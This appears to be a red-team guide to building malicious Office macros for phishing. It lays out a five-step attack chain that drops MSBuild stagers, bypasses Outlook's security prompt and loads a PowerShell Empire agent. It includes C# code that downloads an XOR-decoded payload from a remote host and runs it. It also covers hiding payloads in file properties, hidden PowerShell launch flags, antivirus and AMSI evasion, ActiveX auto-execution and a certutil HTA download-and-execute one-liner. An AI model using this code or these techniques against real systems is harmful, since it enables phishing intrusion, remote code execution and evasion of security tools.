# Attack Vectors Development
___
* [5 Step Phish Attack](#10-step-attack)
* [Case #1: Hide PowerShell Payload in File Properties](#hide-powershell-payload-in-file-properties)
* [Case #2: Actrive X Controls for Macro Execution](#actrive-x-controls-for-macro-execution)
* [Case #3: Download and Execute](#download-and-execute)
* Case #4: Macro ID's OS and Executes Payload
* Case #5: RTF + Signed Binary + DLL Highjacking + Custom MSF Loader
* Case #6: Embeded Executable in Macro [executable2vbx]
* Case #7: Network Tracing Macro
* Case #8: APT Multi-stage Malware w/DNS Payload Retrieval & Execute
* Case #9: Macro Direct Shellcode Injection
* Case #10: Macro in PowerPoint

## Pre-Attack Setup

1. Create Office file

2. Create malicious maco or other delivery method

3. Create any additional malicous files

4. Embed Office file with payload delivery methods

   **Macro Note** Auto execute macro on file open

   ```vbscript
   Sub Auto_Open()
       ...script...
   End Sub
   ```

   

## Attack

Five steps to utilizing the below Use Cases to develop and deploy an attack.

1. Attacker emails malicious XLS file to target
2. Target openes maliccious XLS file and enables macro
3. Malicious XLS file drops **msbuild_outlook.xml**, **msbuild\_prompt_bypass.xml**, and **msbuild_stager.xml** into the `%PUBLIC%\Libraries\` directory.  
	- The outlook malware and security bypass are loaded into memory.
	- The Outlook malware constantly monitors the targets mailbox (inbox, junk, & deleted) for a *trigger email*.  Outlooks security promopt is bypassed by a custom PowerShell `sendkeys` script.
4. Attacker sends *trigger email*
5. *Trigger email* is identified by the Outlook malware. The dropped **msbuild_stager.xml** is given to `MSBuild` as an argument.  PowerShell Empire's agent is eventually loaded.  _no interaction with PowerShell occurs_ 

Sample C# Code: [Full ReverseShell](https://github.com/sn8ke01/pxt/blob/master/scripts/powermemory-reverseshell.xml)

```cs
public override bool Execute() {
					string pok = "$WC=NeW-OBJecT SyStem.NET.WEbCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeAders.ADd('User-Agent',$u);$Wc.ProxY = [SYsTem.NET.WEBREQUesT]::DEFAuLtWebPRoxy;$WC.PROxY.CrEdentIalS = [SYSteM.Net.CreDentialCACHe]::DEFAulTNETWOrkCrEdEnTialS;$K='daf00538a3dfee3f25671a3f9d076377';$i=0;[Char[]]$B=([char[]]($Wc.DownLoADSTriNG('http://10.0.2.15:8080/index.asp')))|%{$_-bXoR$K[$I++%$K.LENGTH]};IEX ($b-joiN'')";
					Runspace runspace = RunspaceFactory.CreateRunspace();
					runspace.Open();
					RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
					Pipeline pipeline = runspace.CreatePipeline();
					pipeline.Commands.AddScript(pok);
					pipeline.Invoke();
					runspace.Close();			
					return true;
```
## Hide PowerShell Payload in File Properties
This Macro hides PowerShell payload in the file's properties.  In this *USE CASE* it hide inside the **Author** property.

This macro also hides PowerShell cmd's arg from command-line logging via `Stdln.WriteLine`.

PowerShell is lauched with multiple cmd line args to create a silent execution.

```PowerShell
powershell.exe Set-ExecutionPolicy -ExecutionPolicy Unrestricted -WindowStyle Hidden -noprofile -noexit
```

* **AutoOpen** is picked up by some AVs so other ways for triggering the macro should be considered. Ex: Marco triggering button.
* **File Propery Deletion:**  Each modification to the macro OR file content will delete the Author property.  This will need to be readded.
* **Evasion Technique:**  Encode the payload and hide in a custom Excel form or spreadsheet 
* **Windows 10 AMSI detection:**  Use Case PowerShell cmd may get picked up by Windows 10 [AMSI](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal?redirectedfrom=MSDN)
* **Obfuscation:**  Include non fuctinal code (ex variable *c*).

[**Source Code**](https://github.com/sn8ke01/pxt/blob/master/scripts/131-UseCase1-CustomMacro.txt)

## Actrive X Controls for Macro Execution
This Macro uses an Active X sub-routine to execute the code.  Specifficlly `InkEdit` control will auto execute the code.

Active X controls that will auto run a macro: [Grey Hat Hacker List](http://www.greyhathacker.net/?p=948)

**Embed Active X control**

1. Enable Developer Tab [File - Options - Customize Ribbon]
2. Under Controls Section: Legacy Tools - More Options


* `InkEdit` Macro that downloads an EXE then executes the EXE: [**Active X Macro Code**](https://github.com/sn8ke01/pxt/blob/master/scripts/131-UseCase2-ActiveX-Macro.txt)
* `InkEdit` Macro that downloads *stager1.ps1* and *stager2.ps1* [**Active X Macro Code w/WMI**](https://github.com/sn8ke01/pxt/blob/master/scripts/131-UseCase2-ActiveX-WMI-Macro.txt)

## Download and Execute
This macro utilizes Windows `certutils`.

- Drops **base64** encoded **HTA** file. Ex Stager exported as an **HTA**
- `certutils` decodes and executes **HTA** file

```cmd
cmd /c certutil -decode encoded.crt encoded.hta & start encoded.hta
```
Metasploit, Powershell Empire, Social Engineering Toolkit, Unicors, and others have the capability to export thier stagers as HTA files.

**PowerShell Empire** post-exploitation stager/agent

1. Setup a PSE listener
2. run `usestager hta listener_name`
3. `execute`
4. **base64** encode output & save as **crt** file

(See walkthrough for more detail) :boom: (walktrough not ready yet)

[**Source Code**](https://github.com/sn8ke01/pxt/blob/master/scripts/131-UseCase3-DownloadandExecute.txt)

